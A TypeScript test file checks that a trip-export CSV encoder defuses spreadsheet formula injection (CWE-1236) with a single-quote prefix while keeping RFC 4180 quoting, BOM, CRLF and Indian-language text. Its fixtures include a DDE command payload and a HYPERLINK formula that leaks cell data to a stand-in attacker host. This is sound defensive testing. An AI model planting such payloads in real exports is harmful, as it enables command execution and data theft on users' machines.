/**
 * A trip export must never hand a spreadsheet a formula (CWE-1236, SEC-P1A).
 *
 * Client names, addresses and driver names are typed by people (or come back
 * from a geocoder) and go into the CSV verbatim. A cell that starts with
 * = + - @ TAB or CR is evaluated by Excel, LibreOffice and Sheets: `=1+1`
 * becomes 2, `=HYPERLINK(...)` becomes a live link that can leak the sheet.
 * The encoder prefixes a single quote, so the cell is shown as the text it
 * was, and keeps RFC 4180 quoting, the BOM and CRLF.
 *
 * Moved from the reproduction red test
 * (.runtime/production/repro/security/csv/csvFormulaInjection.red.test.ts).
 */
import { describe, expect, it } from 'vitest'

import { EXPORT_COLUMNS, csvCell, exportRow, toCsv } from './tripExport'

/** The value a spreadsheet would parse out of one CSV field (RFC 4180 unquote). */
const unquote = (cell: string): string =>
  cell.startsWith('"') && cell.endsWith('"') ? cell.slice(1, -1).replaceAll('""', '"') : cell

const FORMULA_START = /^[=+\-@\t\r]/

const HOSTILE = ['=1+1', '+SUM(1,2)', '-10+20', '@SUM(1,2)', '\t=cmd', '\r=cmd', "=cmd|' /C calc'!A0"]

describe('CSV formula injection (CWE-1236)', () => {
  it.each(HOSTILE)('csvCell(%j) cannot start a formula', (value) => {
    const parsed = unquote(csvCell(value))
    expect(parsed).not.toMatch(FORMULA_START)
    // Literal user data preserved: nothing stripped, only a neutralising prefix.
    expect(parsed).toBe(`'${value}`)
  })

  it('a hostile client name exported through a trip row cannot start a formula (trim included)', () => {
    for (const value of HOSTILE) {
      const trip = { id: 'x', trip_code: 'TRP-1', client_name: value, origin: value, destination: value,
        status: 'DRAFT', selected_route_id: null, created_at: null, started_at: null, delivered_at: null } as never
      const line = toCsv([exportRow(trip, { driver: value, truck: value })]).split('\r\n')[1]
      // Every field of the data row: split on commas outside quotes.
      const fields = line.match(/("([^"]|"")*"|[^,]*)(,|$)/g)!.map((f) => unquote(f.replace(/,$/, '')))
      for (const f of fields) expect(f).not.toMatch(FORMULA_START)
    }
  })

  it('checks the value as a spreadsheet trims it, and keeps the spaces it had', () => {
    expect(csvCell(' =1+1')).toBe("' =1+1")
    expect(csvCell('\n=1+1')).toBe(`"'\n=1+1"`)
    expect(csvCell('  @SUM(A1)')).toBe("'  @SUM(A1)")
  })

  it('prefixes and quotes a formula that also carries commas and quotes', () => {
    const link = '=HYPERLINK("http://attacker.invalid/?leak="&A1,"Open invoice")'
    expect(csvCell(link)).toBe(`"'=HYPERLINK(""http://attacker.invalid/?leak=""&A1,""Open invoice"")"`)
    expect(unquote(csvCell(link))).toBe(`'${link}`)
  })

  it('leaves ordinary text alone: a dash or an at-sign inside a value is not a formula', () => {
    for (const plain of ['Brahmaputra Traders', 'TRP-ALPHA', 'AS-01 depot', 'orders@traders.in', 'Not recorded', '']) {
      expect(csvCell(plain)).toBe(plain)
    }
  })

  it('keeps RFC 4180 quoting and Indian-language text intact', () => {
    expect(csvCell('Traders, Guwahati')).toBe('"Traders, Guwahati"')
    expect(csvCell('He said "go"')).toBe('"He said ""go"""')
    expect(csvCell('two\nlines')).toBe('"two\nlines"')
    expect(csvCell('ব্ৰহ্মপুত্ৰ ট্ৰেডাৰ্ছ')).toBe('ব্ৰহ্মপুত্ৰ ট্ৰেডাৰ্ছ')
    expect(csvCell('गुवाहाटी परिवहन')).toBe('गुवाहाटी परिवहन')
    expect(csvCell('=ব্ৰহ্মপুত্ৰ, "গুৱাহাটী"')).toBe(`"'=ব্ৰহ্মপুত্ৰ, ""গুৱাহাটী"""`)
  })

  it('keeps the BOM, the header row and CRLF line ends', () => {
    const trip = { id: 'x', trip_code: 'TRP-1', client_name: '=1+1', origin: 'गुवाहाटी', destination: 'Shillong',
      status: 'DRAFT', selected_route_id: null, created_at: null, started_at: null, delivered_at: null } as never
    const csv = toCsv([exportRow(trip, { driver: 'D', truck: 'T' })])
    expect(csv.startsWith('﻿')).toBe(true)
    expect(csv.endsWith('\r\n')).toBe(true)
    const [head, row] = csv.slice(1).split('\r\n')
    expect(head).toBe(EXPORT_COLUMNS.map(([, label]) => label).join(','))
    expect(row.startsWith("TRP-1,'=1+1,गुवाहाटी,Shillong,D,T,DRAFT,")).toBe(true)
  })
})
